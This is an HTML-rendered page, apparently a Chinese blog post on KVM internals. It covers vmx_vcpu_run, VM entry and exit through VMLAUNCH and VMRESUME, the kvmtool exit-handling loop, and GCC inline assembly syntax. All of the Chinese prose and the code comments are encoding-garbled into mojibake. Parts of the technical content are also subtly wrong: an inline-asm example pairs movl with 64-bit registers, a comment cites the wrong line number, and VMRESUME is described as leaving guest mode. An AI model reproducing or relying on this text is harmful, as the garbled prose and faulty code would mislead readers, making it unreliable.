6aa8b732ca01c3d7a54e93f4d701b8aabbe60fb7</span><br><span class="hljs-comment">// [PATCH] kvm: userspace interface</span><br><span class="hljs-comment">// linux.git/drivers/kvm/vmx.c</span><br><br><span class="hljs-comment">// å®šä¹‰vmx_vcpu_runå‡½æ•°ï¼Œç”¨äºè™šæ‹ŸCPUçš„è¿è¡Œå’Œåˆ‡æ¢</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">vmx_vcpu_run</span><span class="hljs-params">(struct kvm_vcpu *vcpu, ...)</span></span><br><span class="hljs-function"></span>&#123;<br>    u8 fail;<br>    u16 fs_sel, gs_sel, ldt_sel;<br>    <span class="hljs-keyword">int</span> fs_gs_ldt_reload_needed;<br>again:<br>    <span class="hljs-comment">// ... å…¶ä»–ä»£ç  ...</span><br>    <br>    <span class="hljs-comment">// è¿›å…¥Guestæ¨¡å¼</span><br>    <span class="hljs-string">&quot;jne launched \n\t&quot;</span> <span class="hljs-comment">// æ£€æŸ¥å‰ä¸€ä¸ªæŒ‡ä»¤æ˜¯å¦å¤±è´¥ï¼Œå¦‚æœå¤±è´¥åˆ™è·³è½¬åˆ°launchedæ ‡ç­¾ï¼Œæ‰§è¡ŒVMLAUNCHæŒ‡ä»¤</span><br>    ASM_VMX_VMLAUNCH <span class="hljs-string">&quot;\n\t&quot;</span> <span class="hljs-comment">// VMLAUNCHæŒ‡ä»¤ï¼Œç”¨äºåˆ‡å…¥Guestæ¨¡å¼</span><br>    <span class="hljs-string">&quot;jmp kvm_vmx_return \n\t&quot;</span> <span class="hljs-comment">// è·³è½¬åˆ°kvm_vmx_returnæ ‡ç­¾ï¼Œç»§ç»­æ‰§è¡Œåç»­ä»£ç </span><br><span class="hljs-string">&quot;launched: &quot;</span> ASM_VMX_VMRESUME <span class="hljs-string">&quot;\n\t&quot;</span> <span class="hljs-comment">// VMRESUMEæŒ‡ä»¤ï¼Œç”¨äºåˆ‡å‡ºGuestæ¨¡å¼</span><br><span class="hljs-string">&quot;.globl kvm_vmx_return \n\t&quot;</span> <span class="hljs-comment">// å£°æ˜kvm_vmx_returnæ ‡ç­¾ä¸ºå…¨å±€æ ‡ç­¾</span><br><span class="hljs-string">&quot;kvm_vmx_return: &quot;</span> <span class="hljs-comment">// kvm_vmx_returnæ ‡ç­¾ï¼Œç”¨äºåœ¨éœ€è¦æ—¶ä»å…¶ä»–ä»£ç æ®µè·³è½¬åˆ°è¯¥æ ‡ç­¾å¤„</span><br>    <span class="hljs-comment">// ... å…¶ä»–ä»£ç  ...</span><br>    <br>    <span class="hljs-comment">// å¤„ç†è™šæ‹Ÿæœºé€€å‡º</span><br>    <span class="hljs-keyword">if</span> (kvm_handle_exit(kvm_run, vcpu)) &#123;<br>        <span class="hljs-comment">// å¦‚æœè™šæ‹Ÿæœºé€€å‡ºåŸå› åœ¨ã€å†…æ ¸ä¸­ã€‘å¾—åˆ°å¤„ç†ï¼Œåˆ™è·³è½¬åˆ°againæ ‡ç­¾ï¼Œå†æ¬¡è¿›å…¥Guestæ¨¡å¼è¿è¡Œ</span><br>        <span class="hljs-keyword">goto</span> again;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// å‡½æ•°ç»“æŸï¼Œè¿”å›0è¡¨ç¤ºè™šæ‹Ÿæœºè¿è¡Œæ­£å¸¸</span><br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ä»Guestæ¨¡å¼é€€å‡ºæ—¶ï¼ŒKVMæ¨¡å—é¦–å…ˆè°ƒç”¨å‡½æ•°<code>kvm_handle_exit</code>å°è¯•åœ¨å†…æ ¸ç©ºé—´å¤„ç†è™šæ‹Ÿæœºçš„é€€å‡ºåŸå› ã€‚è¯¥å‡½æ•°æœ‰ä¸€ä¸ªçº¦å®šï¼šå¦‚æœ<strong>åœ¨å†…æ ¸ç©ºé—´</strong>æˆåŠŸå¤„ç†è™šæ‹Ÿæœºé€€å‡ºï¼Œæˆ–è€…æ˜¯å› ä¸ºå…¶ä»–å¹²æ‰°ï¼ˆæ¯”å¦‚å¤–éƒ¨ä¸­æ–­ï¼‰å¯¼è‡´è™šæ‹Ÿæœºé€€å‡ºç­‰æ— éœ€åˆ‡æ¢åˆ°Hostçš„ç”¨æˆ·ç©ºé—´ï¼Œåˆ™è¿”å›1ï¼›å¦åˆ™è¿”å›0ï¼Œè¡¨ç¤ºéœ€è¦æ±‚åŠ©KVMçš„ç”¨æˆ·ç©ºé—´å¤„ç†è™šæ‹Ÿæœºé€€å‡ºï¼Œä¾‹å¦‚éœ€è¦KVMç”¨æˆ·ç©ºé—´çš„æ¨¡æ‹Ÿè®¾å¤‡æ¥å¤„ç†å¤–è®¾è¯·æ±‚ã€‚</p><ul><li><p>å¦‚æœå†…æ ¸ç©ºé—´æˆåŠŸå¤„ç†äº†è™šæ‹Ÿæœºçš„é€€å‡ºï¼ˆ<code>kvm_handle_exit</code>è¿”å›1ï¼‰ï¼Œåœ¨ä¸Šè¿°ä»£ç ä¸­å³ç›´æ¥è·³è½¬åˆ°æ ‡ç­¾<code>again</code>å¤„ï¼Œç„¶åç¨‹åºæµç¨‹ä¼šå†æ¬¡åˆ‡å…¥Guestæ¨¡å¼ï¼Œç»§ç»­æ‰§è¡ŒGuestçš„æŒ‡ä»¤ã€‚</p></li><li><p>å¦‚æœå‡½æ•°<code>kvm_handle_exit</code>è¿”å›0ï¼Œåˆ™å‡½æ•°<code>vmx_vcpu_run</code>ç»“æŸæ‰§è¡Œï¼ŒCPUä»å†…æ ¸ç©ºé—´è¿”å›åˆ°ç”¨æˆ·ç©ºé—´ã€‚åœ¨ç”¨æˆ·ç©ºé—´ï¼Œä¾‹å¦‚ä½¿ç”¨<code>kvmtool</code>ä½œä¸ºä¾‹å­ï¼Œä¼šå¤„ç†Guestçš„è¯·æ±‚ï¼Œæ¯”å¦‚è°ƒç”¨æ¨¡æ‹Ÿè®¾å¤‡æ¥å¤„ç†I/Oè¯·æ±‚ã€‚å¤„ç†å®ŒGuestçš„è¯·æ±‚åï¼Œç¨‹åºé‡æ–°è¿›å…¥ä¸‹ä¸€è½®forå¾ªç¯ï¼Œ<code>kvmtool</code>å†æ¬¡è¯·æ±‚KVMæ¨¡å—åˆ‡å…¥Guestæ¨¡å¼ï¼Œç»§ç»­æ‰§è¡ŒGuestçš„æŒ‡ä»¤ã€‚</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">commit <span class="hljs-number">8</span>d20223edc81c6b199842b36fcd5b0aa1b8d3456<br>Dump KVM_EXIT_IO details<br>kvmtool.git/kvm.<span class="hljs-function">c</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>â€¦<br><span class="hljs-keyword">for</span> (;;) &#123;<br>kvm__run(kvm);<br><span class="hljs-keyword">switch</span> (kvm-&gt;kvm_run-&gt;exit_reason) &#123;<br><span class="hljs-keyword">case</span> KVM_EXIT_IO:<br>â€¦<br>&#125;<br>â€¦<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2è™šæ‹Ÿæœºåˆ‡å…¥å’Œé€€å‡º"><a href="#1-2è™šæ‹Ÿæœºåˆ‡å…¥å’Œé€€å‡º" class="headerlink" title="1.2è™šæ‹Ÿæœºåˆ‡å…¥å’Œé€€å‡º"></a>1.2è™šæ‹Ÿæœºåˆ‡å…¥å’Œé€€å‡º</h2><h3 id="1-2-1GCCå†…è”æ±‡ç¼–"><a href="#1-2-1GCCå†…è”æ±‡ç¼–" class="headerlink" title="1.2.1GCCå†…è”æ±‡ç¼–"></a>1.2.1GCCå†…è”æ±‡ç¼–</h3><blockquote><p>KVMæ¨¡å—ä¸­åˆ‡å…¥Guestæ¨¡å¼çš„ä»£ç ä½¿ç”¨GCCçš„å†…è”æ±‡ç¼–ç¼–å†™</p></blockquote><p>å†…è”æ±‡ç¼–åŸºæœ¬è¯­æ³•æ¨¡æ¿å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">( assembler <span class="hljs-keyword">template</span></span></span><br><span class="hljs-params"><span class="hljs-function">    : output operands <span class="hljs-comment">/* optional */</span></span></span><br><span class="hljs-params"><span class="hljs-function">    : input operands <span class="hljs-comment">/* optional */</span></span></span><br><span class="hljs-params"><span class="hljs-function">    : <span class="hljs-built_in">list</span> of clobbered registers <span class="hljs-comment">/* optional */</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>asmä¸ºGCCå…³é”®å­—ï¼Œè¡¨ç¤ºæ¥ä¸‹æ¥è¦åµŒå…¥æ±‡ç¼–ä»£ç </li><li>volatileä¸ºå¯é€‰å…³é”®å­—ï¼Œè¡¨ç¤ºä¸éœ€è¦GCCå¯¹ä¸‹é¢çš„æ±‡ç¼–ä»£ç åšä»»ä½•ä¼˜åŒ–</li><li>assembler templateæ˜¯è¦åµŒå…¥çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œå¦‚æœå†…åµŒå¤šè¡Œæ±‡ç¼–æŒ‡ä»¤ï¼Œåˆ™æ¯æ¡æŒ‡ä»¤å ç”¨1è¡Œï¼Œæ¯è¡ŒæŒ‡ä»¤ä½¿ç”¨åŒå¼•å·æ‹¬èµ·æ¥ï¼Œä»¥åç¼€<code>\n\t</code>ç»“å°¾</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">__asm_<span class="hljs-number">_</span> (<span class="hljs-string">&quot;movl %eax, %ebx \n\t&quot;</span><br>    <span class="hljs-string">&quot;movl $56, %esi \n\t&quot;</span><br>    <span class="hljs-string">&quot;movl %ecx, $label(%edx,%ebx,$4) \n\t&quot;</span><br>    <span class="hljs-string">&quot;movb %ah, (%ebx) \n\t&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>å½“ä½¿ç”¨æ‰©å±•æ¨¡å¼ï¼Œå³åŒ…å«outputã€inputå’Œclobber listéƒ¨åˆ†æ—¶ï¼Œæ±‡ç¼–æŒ‡ä»¤ä¸­éœ€è¦ä½¿ç”¨ä¸¤ä¸ªâ€œ%â€æ¥å¼•ç”¨å¯„å­˜å™¨ï¼Œæ¯”å¦‚%%raxï¼›ä½¿ç”¨ä¸€ä¸ªâ€œ%â€æ¥å¼•ç”¨è¾“å…¥ã€è¾“å‡ºæ“ä½œæ•°ï¼Œæ¯”å¦‚%1ï¼Œä»¥ä¾¿å¸®åŠ©GCCåŒºåˆ†å¯„å­˜å™¨å’Œç”±Cè¯­è¨€æä¾›çš„æ“ä½œæ•°</p></blockquote><ul><li><p><strong>è¾“å‡ºæ“ä½œæ•°ï¼ˆoutput operandsï¼‰</strong>ã€‚è¾“å‡ºæ“ä½œæ•°ï¼Œç”¨æ¥æŒ‡ç¤ºå†…è”æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹äº†Cä»£ç ä¸­çš„å˜é‡ã€‚å¦‚æœæœ‰å¤šä¸ªè¾“å‡ºå‚æ•°ï¼Œåˆ™éœ€è¦å¯¹æ¯ä¸ªè¾“å‡ºå‚æ•°è¿›è¡Œåˆ†éš”ã€‚</p><ul><li>è¾“å‡ºæ“ä½œæ•°çš„æ ¼å¼å¯ä»¥ä¸º<code>[[asmSymbolicName]] constraint (cvariablename)</code>ï¼Œå¯ä»¥ä¸ºè¾“å‡ºæ“ä½œæ•°æŒ‡å®šä¸€ä¸ªåå­—asmSymbolicNameï¼Œæ±‡ç¼–æŒ‡ä»¤ä¸­å¯ä»¥ä½¿ç”¨è¿™ä¸ªåå­—å¼•ç”¨è¾“å‡ºæ“ä½œæ•°ã€‚çº¦æŸéƒ¨åˆ†å¿…é¡»ä»¥â€œ=â€æˆ–è€…â€œ+â€ä½œä¸ºå‰ç¼€ï¼Œâ€œ=â€è¡¨ç¤ºåªå†™ï¼Œâ€œ+â€è¡¨ç¤ºè¯»å†™ã€‚åœ¨å‰ç¼€ä¹‹åï¼Œå°±å¯ä»¥æ˜¯å„ç§çº¦æŸäº†ï¼Œæ¯”å¦‚â€œ=aâ€è¡¨ç¤ºå…ˆå°†ç»“æœè¾“å‡ºè‡³rax/eaxå¯„å­˜å™¨ï¼Œç„¶åå†ç”±rax/eaxå¯„å­˜å™¨æ›´æ–°ç›¸åº”çš„è¾“å‡ºå˜é‡ã€‚cvariablenameä¸ºä»£ç ä¸­çš„Cå˜é‡åå­—ï¼Œéœ€è¦ä½¿ç”¨æ‹¬å·æ‹¬èµ·æ¥</li><li>ä¹Ÿå¯ä»¥ä½¿ç”¨åºå·å¼•ç”¨æ“ä½œæ•°æ¯”å¦‚è¾“å‡ºæ“ä½œæ•°æœ‰ä¸¤ä¸ªï¼Œé‚£ä¹ˆå¯ä»¥ç”¨**%0å¼•ç”¨ç¬¬1ä¸ªè¾“å‡ºæ“ä½œæ•°ï¼Œ%1å¼•ç”¨ç¬¬2ä¸ªæ“ä½œæ•°**ï¼Œä»¥æ­¤ç±»æ¨ã€‚</li></ul></li><li><p><strong>è¾“å…¥æ“ä½œæ•°ï¼ˆinput operandsï¼‰</strong>ã€‚ä¸è¾“å‡ºæ“ä½œæ•°ç›¸ä¼¼ã€‚è¾“å…¥æ“ä½œæ•°æ¥è‡ªCä»£ç ä¸­çš„å˜é‡æˆ–è€…è¡¨è¾¾å¼ã€‚</p><ul><li>é™¤äº†ä¸å¿…ä»¥â€œ=â€æˆ–è€…â€œ+â€å‰ç¼€å¼€å¤´å¤–ï¼Œè¾“å…¥æ“ä½œæ•°çš„å‰ç¼€ä¸è¾“å‡ºæ“ä½œæ•°åŸºæœ¬ç›¸åŒã€‚</li><li>è¾“å‡ºæ“ä½œæ•°çš„æ ¼å¼å¯ä»¥ä¸º<code>[[asmSymbolicName]] constraint (cvariablename)</code></li><li>é™¤äº†å¯„å­˜å™¨çº¦æŸå¤–ï¼Œâ€œiâ€è¿™ä¸ªçº¦æŸï¼Œè¡¨ç¤ºè¿™ä¸ªè¾“å…¥æ“ä½œæ•°æ˜¯ä¸ªç«‹å³æ•°ï¼ˆimmediateintegerï¼‰</li><li>è¾“å‡ºæ“ä½œæ•°çš„æ ¼å¼ä¹Ÿå¯ä»¥ä»æœ€åä¸€ä¸ªè¾“å‡ºæ“ä½œæ•°çš„åºå·åŠ 1å¼€å§‹ï¼Œæ¯”å¦‚è¾“å‡ºæ“ä½œæ•°æœ‰ä¸¤ä¸ªï¼Œè¾“å…¥æ“ä½œæ•°æœ‰3ä¸ªï¼Œé‚£ä¹ˆéœ€è¦ä½¿ç”¨%2å¼•ç”¨ç¬¬1ä¸ªè¾“å…¥æ“ä½œæ•°ï¼Œ%3å¼•ç”¨ç¬¬2ä¸ªè¾“å…¥æ“ä½œæ•°ï¼Œä»¥æ­¤ç±»æ¨ã€‚</li></ul></li><li><p><strong>clobber list</strong></p><ul><li>æ±‡ç¼–æŒ‡ä»¤æ‰§è¡Œå<strong>å¯èƒ½ä¼šéšæ€§åœ°å½±å“æŸäº›å¯„å­˜å™¨æˆ–è€…å†…å­˜çš„å€¼</strong>ï¼Œå¦‚æœè¢«å½±å“çš„å¯„å­˜å™¨æˆ–è€…å†…å­˜å¹¶æ²¡æœ‰åœ¨è¾“å…¥ã€è¾“å‡ºæ“ä½œæ•°ä¸­åˆ—å‡ºæ¥ï¼Œé‚£ä¹ˆéœ€è¦å°†è¿™äº›å¯„å­˜å™¨æˆ–è€…å†…å­˜åˆ—å…¥clobber listã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå†…è”æ±‡ç¼–å‘ŠçŸ¥GCCï¼Œåœ¨æ‰§è¡Œå†…è”æ±‡ç¼–æŒ‡ä»¤åæ¢å¤å¯„å­˜å™¨çš„å€¼</li></ul></li></ul><p>ä¸€ä¸ªå…·ä½“çš„ä¾‹å­ï¼šä¸€ä¸ªåŠ æ³•è¿ç®—ï¼Œä¸€ä¸ªåŠ æ•°æ˜¯valï¼Œå€¼ä¸º100ï¼Œå¦å¤–ä¸€ä¸ªåŠ æ•°æ˜¯ä¸€ä¸ªç«‹å³æ•°400ï¼Œè®¡ç®—ç»“æœä¿å­˜åˆ°å˜é‡sumä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">01</span> <span class="hljs-keyword">int</span> val = <span class="hljs-number">100</span>, sum = <span class="hljs-number">0</span>;<br><br><span class="hljs-number">03</span> <span class="hljs-comment">// ä½¿ç”¨å†…è”æ±‡ç¼–å°† val + 400 çš„ç»“æœå­˜å‚¨åˆ° sum å˜é‡ä¸­</span><br><span class="hljs-number">04</span> <span class="hljs-keyword">asm</span> (<span class="hljs-string">&quot;movl %1, %%rax; \n\t&quot;</span>  <span class="hljs-comment">// å°† val çš„å€¼åŠ è½½åˆ°å¯„å­˜å™¨ rax</span><br><span class="hljs-number">05</span>      <span class="hljs-string">&quot;movl %c[addend], %%rbx; \n\t&quot;</span>  <span class="hljs-comment">// å°†å¸¸é‡ 400 åŠ è½½åˆ°å¯„å­˜å™¨ rbx</span><br><span class="hljs-number">06</span>      <span class="hljs-string">&quot;addl %%rbx, %%rax; \n\t&quot;</span>  <span class="hljs-comment">// å°† rax å’Œ rbx å¯„å­˜å™¨çš„å€¼ç›¸åŠ ï¼Œç»“æœä¿å­˜åœ¨ rax</span><br><span class="hljs-number">07</span>      <span class="hljs-string">&quot;movl %%rax, %0; \n\t&quot;</span>  <span class="hljs-comment">// å°† rax å¯„å­˜å™¨çš„å€¼å­˜å› sum å˜é‡</span><br><span class="hljs-number">08</span>     <br><span class="hljs-number">09</span>      : <span class="hljs-string">&quot;=r&quot;</span> (sum)  <span class="hljs-comment">// è¾“å‡ºçº¦æŸï¼šå°† rax å¯„å­˜å™¨çš„å€¼å­˜å‚¨åˆ° sum å˜é‡ä¸­</span><br><span class="hljs-number">10</span>      : <span class="hljs-string">&quot;r&quot;</span> (val), [addend] <span class="hljs-string">&quot;i&quot;</span> (<span class="hljs-number">400</span>)  <span class="hljs-comment">// è¾“å…¥çº¦æŸï¼šval æ˜¯å˜é‡è¾“å…¥ï¼Œ[addend] è¡¨ç¤ºå¸¸é‡ 400</span><br><span class="hljs-number">11</span>      : <span class="hljs-string">&quot;rbx&quot;</span>  <span class="hljs-comment">// clobberçº¦æŸï¼šè¡¨ç¤ºå¯„å­˜å™¨ rbx åœ¨å†…è”æ±‡ç¼–ä»£ç ä¸­è¢«ä½¿ç”¨</span><br><span class="hljs-number">12</span> );<br><br></code></pre></td></tr></table></figure><p>åœ¨æ±‡ç¼–ä»£ç ä¸­ä½¿ç”¨äº†rbxå¯„å­˜å™¨ï¼Œè€Œrbx å¯„å­˜å™¨æ²¡æœ‰å‡ºç°åœ¨è¾“å‡ºã€è¾“å…¥æ“ä½œæ•°ä¸­ï¼Œæ‰€ä»¥å†…è”æ±‡ç¼–éœ€è¦æŠŠrbxå¯„å­˜ å™¨åˆ—å…¥clobber listä¸­ï¼Œè§ç¬¬10è¡Œä»£ç ï¼Œå‘Šè¯‰GCCæ±‡ç¼–æŒ‡ä»¤æ±¡æŸ“äº†rbx å¯„å­˜å™¨</p><h3 id="1-2-2è™šæ‹Ÿæœºåˆ‡å…¥å’Œé€€å‡ºåŠç›¸å…³çš„ä¸Šä¸‹æ–‡ä¿å­˜"><a href="#1-2-2è™šæ‹Ÿæœºåˆ‡å…¥å’Œé€€å‡ºåŠç›¸å…³çš„ä¸Šä¸‹æ–‡ä¿å­˜" class="headerlink" title="1.2.2è™šæ‹Ÿæœºåˆ‡å…¥å’Œé€€å‡ºåŠç›¸å…³çš„ä¸Šä¸‹æ–‡ä¿å­˜"></a>1.2.2è™šæ‹Ÿæœºåˆ‡å…¥å’Œé€€å‡ºåŠç›¸å…³çš„ä¸Šä¸‹æ–‡ä¿å­˜</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">01</span> <span class="hljs-comment">/* æäº¤å“ˆå¸Œå’Œä»£ç æ–‡ä»¶è·¯å¾„ */</span><br><span class="hljs-number">02</span> <span class="hljs-comment">/* æäº¤ 1c696d0e1b7c10e1e8b34cb6c797329e3c33f262 */</span><br><span class="hljs-number">03</span> <span class="hljs-comment">/* linux.git/arch/x86/kvm/vmx.c */</span><br><span class="hljs-number">04</span> <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vmx_vcpu_run</span><span class="hljs-params">(struct kvm_vcpu *vcpu)</span></span><br><span class="hljs-function">05 </span>&#123;<br><span class="hljs-number">06</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vcpu_vmx</span> *<span class="hljs-title">vmx</span> =</span> to_vmx(vcpu);<br><span class="hljs-number">07</span>     <span class="hljs-keyword">asm</span>(<br><span class="hljs-number">08</span>         <span class="hljs-comment">/* ä¿å­˜å®¿ä¸»æœºå¯„å­˜å™¨ */</span><br><span class="hljs-number">09</span>         <span class="hljs-string">&quot;push %%&quot;</span>R<span class="hljs-string">&quot;dx; push %%&quot;</span>R<span class="hljs-string">&quot;bp;&quot;</span><br><span class="hljs-number">10</span>         <span class="hljs-string">&quot;push %%&quot;</span>R<span class="hljs-string">&quot;cx \n\t&quot;</span><br><span class="hljs-number">11</span>         <span class="hljs-string">&quot;cmp %%&quot;</span>R<span class="hljs-string">&quot;sp, %c[host_rsp](%0) \n\t&quot;</span>; <span class="hljs-comment">/* æ¯”è¾ƒå½“å‰æ ˆæŒ‡é’ˆä¸host_rsp (vmx-&gt;host_rsp) */</span><br><span class="hljs-number">12</span>         <span class="hljs-string">&quot;je 1f \n\t&quot;</span>; <span class="hljs-comment">/* å¦‚æœç›¸ç­‰ (æœªæ”¹å˜æ ˆ), è·³è½¬åˆ°æ ‡ç­¾ 1 */</span><br><span class="hljs-number">13</span>         <span class="hljs-string">&quot;mov %%&quot;</span>R<span class="hljs-string">&quot;sp, %c[host_rsp](%0) \n\t&quot;</span>; <span class="hljs-comment">/* å¦‚æœä¸ç›¸ç­‰ (æ ˆæ”¹å˜), æ›´æ–°host_rspä¸ºå½“å‰æ ˆæŒ‡é’ˆ */</span><br><span class="hljs-number">14</span>         __ex(ASM_VMX_VMWRITE_RSP_RDX) <span class="hljs-string">&quot;\n\t&quot;</span>; <span class="hljs-comment">/* å°†å½“å‰æ ˆæŒ‡é’ˆ (RDX) ä¿å­˜åˆ°guestçŠ¶æ€ */</span><br><br><span class="hljs-number">15</span>         <span class="hljs-string">&quot;1: \n\t&quot;</span>; <span class="hljs-comment">/* æ ‡ç­¾ 1: å¦‚æœcr2å¯„å­˜å™¨å€¼æœ‰æ”¹å˜, é‡æ–°åŠ è½½å®ƒ */</span><br><span class="hljs-number">16</span>         <span class="hljs-string">&quot;mov %c[cr2](%0), %%&quot;</span>R<span class="hljs-string">&quot;ax \n\t&quot;</span>; <span class="hljs-comment">/* å°†ä¿å­˜åœ¨vmx-&gt;cr2ä¸­çš„cr2å¯„å­˜å™¨å€¼åŠ è½½åˆ°RAX */</span><br><span class="hljs-number">17</span>         <span class="hljs-string">&quot;mov %%cr2, %%&quot;</span>R<span class="hljs-string">&quot;dx \n\t&quot;</span>; <span class="hljs-comment">/* å°†å½“å‰çš„cr2å¯„å­˜å™¨å€¼åŠ è½½åˆ°RDX */</span><br><span class="hljs-number">18</span>         <span class="hljs-string">&quot;cmp %%&quot;</span>R<span class="hljs-string">&quot;ax, %%&quot;</span>R<span class="hljs-string">&quot;dx \n\t&quot;</span>; <span class="hljs-comment">/* æ¯”è¾ƒä¿å­˜çš„å€¼ä¸å½“å‰cr2å¯„å­˜å™¨å€¼ */</span><br><span class="hljs-number">19</span>         <span class="hljs-string">&quot;je 2f \n\t&quot;</span>; <span class="hljs-comment">/* å¦‚æœç›¸ç­‰ (æœªæ”¹å˜cr2), è·³è½¬åˆ°æ ‡ç­¾ 2 */</span><br><span class="hljs-number">20</span>         <span class="hljs-string">&quot;mov %%&quot;</span>R<span class="hljs-string">&quot;ax, %%cr2 \n\t&quot;</span>; <span class="hljs-comment">/* å¦‚æœä¸ç›¸ç­‰ (cr2æœ‰æ”¹å˜), é‡æ–°åŠ è½½cr2ä¸ºä¿å­˜çš„å€¼ */</span><br><span class="hljs-number">21</span>         <span class="hljs-string">&quot;2: \n\t&quot;</span>; <span class="hljs-comment">/* æ ‡ç­¾ 2 */</span><br><br><span class="hljs-number">22</span>         <span class="hljs-comment">/* æ£€æŸ¥æ˜¯å¦éœ€è¦vmlaunchæˆ–vmresume */</span><br><span class="hljs-number">23</span>         <span class="hljs-string">&quot;cmpl $0, %c[launched](%0) \n\t&quot;</span>; <span class="hljs-comment">/* æ£€æŸ¥vmx-&gt;launchedçš„å€¼ */</span><br><span class="hljs-number">24</span>         <span class="hljs-comment">/* åŠ è½½å®¢æˆ·æœºå¯„å­˜å™¨ï¼Œä¸ç ´åæ ‡å¿—ä½ */</span><br><span class="hljs-number">25</span>         <span class="hljs-string">&quot;mov %c[rax](%0), %%&quot;</span>R<span class="hljs-string">&quot;ax \n\t&quot;</span>; <span class="hljs-comment">/* å°†vcpu.arch.regs[VCPU_REGS_RAX]çš„å€¼åŠ è½½åˆ°RAX */</span><br><span class="hljs-number">26</span>         <span class="hljs-string">&quot;mov %c[rbx](%0), %%&quot;</span>R<span class="hljs-string">&quot;bx \n\t&quot;</span>; <span class="hljs-comment">/* å°†vcpu.arch.regs[VCPU_REGS_RBX]çš„å€¼åŠ è½½åˆ°RBX */</span><br><span class="hljs-number">27</span>         <span class="hljs-comment">/* ... å…¶ä»–å®¢æˆ·æœºå¯„å­˜å™¨åŠ è½½ ... */</span><br><span class="hljs-number">28</span>         <span class="hljs-string">&quot;mov %c[rcx](%0), %%&quot;</span>R<span class="hljs-string">&quot;cx \n\t&quot;</span>; <span class="hljs-comment">/* å°†vcpu.arch.regs[VCPU_REGS_RCX]çš„å€¼åŠ è½½åˆ°RCX (ç ´åä¹‹å‰RCXçš„å€¼) */</span><br><br><span class="hljs-number">29</span>         <span class="hljs-comment">/* è¿›å…¥å®¢æˆ·æœºæ¨¡å¼ */</span><br><span class="hljs-number">30</span>         <span class="hljs-string">&quot;jne .Llaunched \n\t&quot;</span>; <span class="hljs-comment">/* å¦‚æœvmx-&gt;launched != 0ï¼Œè·³è½¬åˆ°æ ‡ç­¾ .Llaunched */</span><br><span class="hljs-number">31</span>         __ex(ASM_VMX_VMLAUNCH) <span class="hljs-string">&quot;\n\t&quot;</span>; <span class="hljs-comment">/* å¦åˆ™ï¼Œä½¿ç”¨VMLAUNCHæ‰§è¡ŒVM entry */</span><br><span class="hljs-number">32</span>         <span class="hljs-string">&quot;jmp .Lkvm_vmx_return \n\t&quot;</span>; <span class="hljs-comment">/* è·³è½¬åˆ°æ ‡ç­¾ .Lkvm_vmx_return ç»§ç»­ */</span><br><br><span class="hljs-number">33</span>         <span class="hljs-string">&quot;.Llaunched: &quot;</span> 